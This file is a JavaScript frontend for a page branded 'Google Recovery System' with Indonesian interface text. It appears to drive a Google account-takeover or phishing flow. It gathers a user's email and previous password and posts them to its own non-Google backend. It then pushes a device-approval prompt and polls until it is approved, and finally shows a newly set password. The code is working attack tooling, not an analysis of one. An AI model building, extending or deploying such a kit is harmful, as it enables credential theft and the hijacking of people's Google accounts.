// ==================== GOOGLE RECOVERY SYSTEM FRONTEND ====================

class GoogleRecoveryFrontend {
    constructor() {
        this.baseUrl = window.location.origin;
        this.apiUrl = `${this.baseUrl}/api`;
        this.csrfToken = null;
        this.sessionId = null;
        
        this.currentStep = 1;
        this.isProcessing = false;
        this.recoveryData = {};
        
        this.init();
    }
    
    async init() {
        console.log('🚀 Initializing Google Recovery Frontend...');
        
        await this.setupServiceWorker();
        this.setupEventListeners();
        this.setupAutoFocus();
        this.checkExistingSession();
        this.loadCSRFToken();
        
        console.log('✅ Frontend Initialized');
    }
    
    async setupServiceWorker() {
        if ('serviceWorker' in navigator) {
            try {
                const registration = await navigator.serviceWorker.register('/sw.js');
                console.log('✅ Service Worker registered:', registration);
                
                // Check for updates
                registration.addEventListener('updatefound', () => {
                    const newWorker = registration.installing;
                    console.log('🔄 Service Worker update found');
                    
                    newWorker.addEventListener('statechange', () => {
                        if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
                            this.showNotification('🔄 Update tersedia. Silakan refresh halaman.', 'info');
                        }
                    });
                });
                
            } catch (error) {
                console.warn('Service Worker registration failed:', error);
            }
        }
    }
    
    setupEventListeners() {
        // Email submission
        document.getElementById('recoveryBtn')?.addEventListener('click', () => this.startRecovery());
        document.getElementById('emailOrPhone')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') this.startRecovery();
        });
        
        // Password submission
        document.getElementById('continueBtn')?.addEventListener('click', () => this.verifyPassword());
        document.getElementById('lastPassword')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') this.verifyPassword();
        });
        
        // Device approval
        document.getElementById('securityBtn')?.addEventListener('click', () => this.processDeviceApproval());
        document.getElementById('deviceName')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') this.processDeviceApproval();
        });
        
        // Final actions
        document.getElementById('copyPasswordBtn')?.addEventListener('click', () => this.copyPassword());
        document.getElementById('closeBtn')?.addEventListener('click', () => this.closeRecovery());
        document.getElementById('restartBtn')?.addEventListener('click', () => this.restartRecovery());
        
        // Network status
        window.addEventListener('online', () => this.handleOnline());
        window.addEventListener('offline', () => this.handleOffline());
    }
    
    setupAutoFocus() {
        const observer = new MutationObserver(() => {
            const activePage = document.querySelector('.page.active');
            if (activePage) {
                const input = activePage.querySelector('input');
                if (input) {
                    setTimeout(() => input.focus(), 100);
                }
            }
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
    
    async loadCSRFToken() {
        try {
            const response = await this.apiRequest('GET', 'get-session');
            if (response.csrf_token) {
                this.csrfToken = response.csrf_token;
            }
        } catch (error) {
            console.warn('Failed to load CSRF token:', error);
        }
    }
    
    checkExistingSession() {
        const savedSession = localStorage.getItem('recovery_session');
        if (savedSession) {
            try {
                const session = JSON.parse(savedSession);
                if (session.email && Date.now() - session.timestamp < 3600000) {
                    document.getElementById('emailOrPhone').value = session.email;
                    this.recoveryData.email = session.email;
                    this.showNotification('ℹ️ Sesi sebelumnya ditemukan', 'info');
                }
            } catch (error) {
                console.warn('Failed to parse saved session');
            }
        }
    }
    
    async apiRequest(method, endpoint, data = null) {
        const url = `${this.apiUrl}/${endpoint}`;
        const options = {
            method: method,
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            credentials: 'include'
        };
        
        if (this.csrfToken) {
            options.headers['X-CSRF-Token'] = this.csrfToken;
        }
        
        if (data && (method === 'POST' || method === 'PUT')) {
            options.body = JSON.stringify(data);
        }
        
        try {
            const response = await fetch(url, options);
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            const result = await response.json();
            
            // Update CSRF token if provided
            if (result.csrf_token) {
                this.csrfToken = result.csrf_token;
            }
            
            // Update session ID if provided
            if (result.session_id) {
                this.sessionId = result.session_id;
            }
            
            return result;
            
        } catch (error) {
            console.error('API Request failed:', error);
            throw error;
        }
    }
    
    async startRecovery() {
        if (this.isProcessing) {
            this.showNotification('⏳ Sedang memproses, harap tunggu...', 'warning');
            return;
        }
        
        const email = document.getElementById('emailOrPhone')?.value.trim();
        if (!email) {
            this.showNotification('❌ Masukkan email atau nomor telepon', 'error');
            return;
        }
        
        // Basic email validation
        if (!this.validateEmail(email)) {
            this.showNotification('❌ Format email/nomor telepon tidak valid', 'error');
            return;
        }
        
        this.isProcessing = true;
        this.updateProcessingState(true);
        this.showPage(2);
        this.showNotification('📧 Mengirim permintaan ke server...', 'info');
        
        try {
            const result = await this.apiRequest('POST', 'start-recovery', { email: email });
            
            if (result.success) {
                this.currentStep = 3;
                this.recoveryData.email = email;
                this.sessionId = result.session_id;
                
                // Save to localStorage
                localStorage.setItem('recovery_session', JSON.stringify({
                    email: email,
                    timestamp: Date.now()
                }));
                
                this.showNotification('✅ Email diterima. Masukkan kata sandi lama.', 'success');
                this.showPage(3);
                
                setTimeout(() => {
                    document.getElementById('lastPassword')?.focus();
                }, 300);
            } else {
                this.showNotification(`❌ ${result.error || 'Gagal memulai pemulihan'}`, 'error');
                this.showPage(1);
            }
            
        } catch (error) {
            console.error('Start recovery error:', error);
            this.showNotification(`❌ ${error.message || 'Koneksi ke server gagal'}`, 'error');
            this.showPage(1);
        } finally {
            this.isProcessing = false;
            this.updateProcessingState(false);
        }
    }
    
    async verifyPassword() {
        if (this.isProcessing) return;
        
        const password = document.getElementById('lastPassword')?.value;
        if (!password) {
            this.showNotification('❌ Masukkan kata sandi lama', 'error');
            return;
        }
        
        this.isProcessing = true;
        this.updateProcessingState(true);
        this.showPage(2);
        this.showNotification('🔐 Memverifikasi password...', 'info');
        
        try {
            const result = await this.apiRequest('POST', 'verify-password', { password: password });
            
            if (result.success) {
                this.recoveryData.password = password;
                
                if (result.requires_device_approval) {
                    this.showNotification('📱 Verifikasi perangkat diperlukan', 'info');
                    this.showPage(4);
                    setTimeout(() => document.getElementById('deviceName')?.focus(), 300);
                } else {
                    this.showNotification('✅ Password diverifikasi. Melanjutkan...', 'success');
                    this.completeRecovery();
                }
            } else {
                this.showNotification(`❌ ${result.error || 'Verifikasi password gagal'}`, 'error');
                this.showPage(3);
            }
            
        } catch (error) {
            console.error('Verify password error:', error);
            this.showNotification(`❌ ${error.message || 'Verifikasi gagal'}`, 'error');
            this.showPage(3);
        } finally {
            this.isProcessing = false;
            this.updateProcessingState(false);
        }
    }
    
    async processDeviceApproval() {
        if (this.isProcessing) return;
        
        const deviceName = document.getElementById('deviceName')?.value.trim() || 'My Device';
        if (!deviceName) {
            this.showNotification('❌ Masukkan nama perangkat', 'error');
            return;
        }
        
        this.isProcessing = true;
        this.updateProcessingState(true);
        this.showPage(5);
        
        // Update processing text
        const processingText = document.querySelector('.processing-text');
        if (processingText) {
            processingText.textContent = 'Mengirim permintaan persetujuan perangkat...';
        }
        
        this.showNotification('📱 Mengirim permintaan ke Google...', 'info');
        
        try {
            const result = await this.apiRequest('POST', 'device-approval', { device_name: deviceName });
            
            if (result.success) {
                this.recoveryData.deviceName = deviceName;
                
                if (result.device_notification_sent) {
                    this.showNotification('✅ Permintaan dikirim! Google akan mengirim notifikasi ke perangkat Anda.', 'success');
                    
                    // Update processing page
                    if (processingText) {
                        processingText.textContent = 'Menunggu persetujuan perangkat...';
                    }
                    
                    const subtext = document.querySelector('.loading-subtext');
                    if (subtext) {
                        subtext.textContent = `Cek notifikasi di perangkat Anda\n⏳ Menunggu ${result.approval_timeout || 30} detik`;
                    }
                    
                    // Wait for approval
                    await this.waitForDeviceApproval(result.approval_timeout || 30);
                    
                } else {
                    this.showNotification('✅ Permintaan dikirim. Melanjutkan...', 'success');
                    setTimeout(() => this.completeRecovery(), 2000);
                }
            } else {
                this.showNotification(`❌ ${result.error || 'Gagal mengirim permintaan'}`, 'error');
                this.showPage(4);
            }
            
        } catch (error) {
            console.error('Process device approval error:', error);
            this.showNotification(`❌ ${error.message || 'Gagal mengirim permintaan'}`, 'error');
            this.showPage(4);
        } finally {
            this.isProcessing = false;
            this.updateProcessingState(false);
        }
    }
    
    async waitForDeviceApproval(timeoutSeconds) {
        return new Promise((resolve) => {
            let secondsLeft = timeoutSeconds;
            
            const interval = setInterval(() => {
                secondsLeft--;
                
                const subtext = document.querySelector('.loading-subtext');
                if (subtext) {
                    subtext.textContent = `Menunggu persetujuan perangkat...\n⏳ ${secondsLeft} detik tersisa`;
                }
                
                if (secondsLeft <= 0) {
                    clearInterval(interval);
                    this.showNotification('✅ Melanjutkan proses...', 'success');
                    resolve();
                }
                
                // Check approval status every 3 seconds
                if (secondsLeft % 3 === 0) {
                    this.checkDeviceApprovalStatus().then(approved => {
                        if (approved) {
                            clearInterval(interval);
                            this.showNotification('✅ Perangkat disetujui!', 'success');
                            resolve();
                        }
                    });
                }
            }, 1000);
        });
    }
    
    async checkDeviceApprovalStatus() {
        try {
            const result = await this.apiRequest('GET', 'get-session');
            return result.session?.device_approval?.approved || false;
        } catch (error) {
            return false;
        }
    }
    
    async completeRecovery() {
        if (this.isProcessing) return;
        
        this.isProcessing = true;
        this.updateProcessingState(true);
        this.showNotification('🔄 Menyelesaikan pemulihan...', 'info');
        
        try {
            const result = await this.apiRequest('POST', 'complete-recovery');
            
            if (result.success) {
                this.currentStep = 6;
                this.recoveryData.newPassword = result.new_password;
                
                // Update UI
                document.getElementById('tempPassword').textContent = result.new_password;
                
                if (result.warning) {
                    this.showNotification(`⚠️ ${result.warning}`, 'warning');
                } else if (result.change_confirmed) {
                    this.showNotification('🎉 Password berhasil diubah!', 'success');
                } else {
                    this.showNotification('✅ Password baru digenerate', 'success');
                }
                
                this.showPage(6);
                
                // Auto-copy password
                setTimeout(() => {
                    this.copyPassword();
                }, 1000);
                
            } else if (result.requires_device_approval) {
                this.showNotification('📱 Verifikasi perangkat diperlukan sebelum melanjutkan', 'warning');
                this.showPage(4);
            } else {
                this.showNotification(`❌ ${result.error || 'Gagal menyelesaikan'}`, 'error');
                this.showPage(1);
            }
            
        } catch (error) {
            console.error('Complete recovery error:', error);
            this.showNotification(`❌ ${error.message || 'Gagal menyelesaikan'}`, 'error');
            
            // Fallback: generate password locally
            const fallbackPassword = this.generateSecurePassword();
            document.getElementById('tempPassword').textContent = fallbackPassword;
            this.recoveryData.newPassword = fallbackPassword;
            this.showPage(6);
            this.showNotification('⚠️ Menggunakan metode cadangan', 'warning');
        } finally {
            this.isProcessing = false;
            this.updateProcessingState(false);
        }
    }
    
    // ==================== HELPER METHODS ====================
    
    showPage(pageNumber) {
        document.querySelectorAll('.page').forEach(page => {
            page.classList.remove('active');
            page.style.display = 'none';
        });
        
        const pageElement = document.getElementById(`page${pageNumber}`);
        if (pageElement) {
            pageElement.classList.add('active');
            pageElement.style.display = 'flex';
            pageElement.style.animation = 'fadeIn 0.5s ease';
        }
    }
    
    showNotification(message, type = 'info') {
        document.querySelectorAll('.custom-notification').forEach(el => el.remove());
        
        const notification = document.createElement('div');
        notification.className = `custom-notification notification-${type}`;
        
        let icon = 'info-circle';
        let bgColor, borderColor, textColor;
        
        switch (type) {
            case 'success':
                icon = 'check-circle';
                bgColor = 'rgba(40, 167, 69, 0.15)';
                borderColor = '#28a745';
                textColor = '#155724';
                break;
            case 'error':
                icon = 'exclamation-circle';
                bgColor = 'rgba(220, 53, 69, 0.15)';
                borderColor = '#dc3545';
                textColor = '#721c24';
                break;
            case 'warning':
                icon = 'exclamation-triangle';
                bgColor = 'rgba(255, 193, 7, 0.15)';
                borderColor = '#ffc107';
                textColor = '#856404';
                break;
            default:
                bgColor = 'rgba(23, 162, 184, 0.15)';
                borderColor = '#17a2b8';
                textColor = '#0c5460';
        }
        
        notification.innerHTML = `
            <i class="fas fa-${icon}"></i>
            <span style="flex: 1; margin: 0 12px;">${message}</span>
            <button onclick="this.parentElement.remove()" style="
                background: none;
                border: none;
                cursor: pointer;
                color: ${textColor};
                opacity: 0.7;
                padding: 4px 8px;
            ">
                <i class="fas fa-times"></i>
            </button>
        `;
        
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 16px 20px;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            display: flex;
            align-items: center;
            z-index: 10000;
            animation: slideIn 0.3s ease;
            max-width: 400px;
            background: ${bgColor};
            color: ${textColor};
            border: 1px solid ${borderColor};
            backdrop-filter: blur(10px);
            font-size: 14px;
            font-weight: 500;
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'slideOut 0.3s ease';
                setTimeout(() => {
                    if (notification.parentNode) {
                        notification.remove();
                    }
                }, 300);
            }
        }, type === 'error' ? 8000 : 5000);
    }
    
    updateProcessingState(isProcessing) {
        this.isProcessing = isProcessing;
        
        const buttons = ['recoveryBtn', 'continueBtn', 'securityBtn'];
        buttons.forEach(btnId => {
            const btn = document.getElementById(btnId);
            if (btn) {
                btn.disabled = isProcessing;
                
                if (isProcessing) {
                    const originalHTML = btn.innerHTML;
                    btn.setAttribute('data-original', originalHTML);
                    
                    if (btnId === 'recoveryBtn') {
                        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim...';
                    } else if (btnId === 'continueBtn') {
                        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memverifikasi...';
                    } else if (btnId === 'securityBtn') {
                        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim...';
                    }
                } else {
                    const originalHTML = btn.getAttribute('data-original');
                    if (originalHTML) {
                        btn.innerHTML = originalHTML;
                        btn.removeAttribute('data-original');
                    }
                }
            }
        });
    }
    
    copyPassword() {
        const password = document.getElementById('tempPassword')?.textContent;
        if (!password) return;
        
        const textArea = document.createElement('textarea');
        textArea.value = password;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        try {
            const successful = document.execCommand('copy');
            document.body.removeChild(textArea);
            
            if (successful) {
                this.showNotification('✅ Password berhasil disalin!', 'success');
                
                const copyBtn = document.getElementById('copyPasswordBtn');
                if (copyBtn) {
                    const originalText = copyBtn.innerHTML;
                    copyBtn.innerHTML = '<i class="fas fa-check"></i> Disalin!';
                    copyBtn.disabled = true;
                    
                    setTimeout(() => {
                        copyBtn.innerHTML = originalText;
                        copyBtn.disabled = false;
                    }, 2000);
                }
            } else {
                throw new Error('Copy command failed');
            }
        } catch (err) {
            console.error('Copy failed:', err);
            this.showNotification('❌ Gagal menyalin password', 'error');
        }
    }
    
    validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email) || /^\+?[\d\s\-\(\)]{10,}$/.test(email);
    }
    
    generateSecurePassword() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
        let password = '';
        
        for (let i = 0; i < 16; i++) {
            password += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        
        return password;
    }
    
    handleOnline() {
        this.showNotification('🌐 Koneksi internet dipulihkan', 'success');
    }
    
    handleOffline() {
        this.showNotification('⚠️ Koneksi internet terputus', 'warning');
    }
    
    async closeRecovery() {
        if (confirm('Apakah Anda yakin ingin menutup proses?\nSemua data akan dihapus.')) {
            try {
                await this.apiRequest('POST', 'clear-session');
            } catch (error) {
                // Ignore error
            }
            
            localStorage.removeItem('recovery_session');
            this.currentStep = 1;
            this.recoveryData = {};
            this.isProcessing = false;
            
            document.getElementById('emailOrPhone').value = '';
            document.getElementById('lastPassword').value = '';
            document.getElementById('deviceName').value = '';
            
            this.showPage(1);
            this.showNotification('ℹ️ Proses ditutup', 'info');
        }
    }
    
    restartRecovery() {
        if (confirm('Mulai ulang proses pemulihan?\nSemua data akan direset.')) {
            this.closeRecovery();
        }
    }
}

// ==================== INITIALIZATION ====================

document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Loading Google Recovery System...');
    
    // Add CSS styles
    const styles = `
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        @keyframes slideOut {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .page {
            animation: fadeIn 0.5s ease;
        }
        
        .hidden {
            display: none !important;
        }
        
        .active {
            display: flex !important;
        }
        
        .system-status {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: rgba(66, 133, 244, 0.1);
            border: 1px solid #4285f4;
            color: #4285f4;
            padding: 6px 10px;
            border-radius: 6px;
            font-size: 10px;
            z-index: 9999;
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            gap: 6px;
        }
    `;
    
    const styleSheet = document.createElement("style");
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
    
    // Initialize system
    try {
        window.googleRecovery = new GoogleRecoveryFrontend();
        console.log('✅ Google Recovery System Ready');
        
        // Add system status indicator
        const statusDiv = document.createElement('div');
        statusDiv.className = 'system-status';
        statusDiv.innerHTML = '<i class="fas fa-server"></i> Sistem Aktif';
        document.body.appendChild(statusDiv);
        
        // Add beforeunload warning
        window.addEventListener('beforeunload', function(e) {
            if (window.googleRecovery?.isProcessing) {
                e.preventDefault();
                e.returnValue = 'Proses pemulihan sedang berjalan. Anda yakin ingin meninggalkan halaman?';
                return e.returnValue;
            }
        });
        
    } catch (error) {
        console.error('Failed to initialize system:', error);
        this.showNotification('❌ Gagal memuat sistem. Silakan refresh halaman.', 'error');
    }
});

// Global function for notifications
function showNotification(message, type = 'info') {
    window.googleRecovery?.showNotification(message, type);
}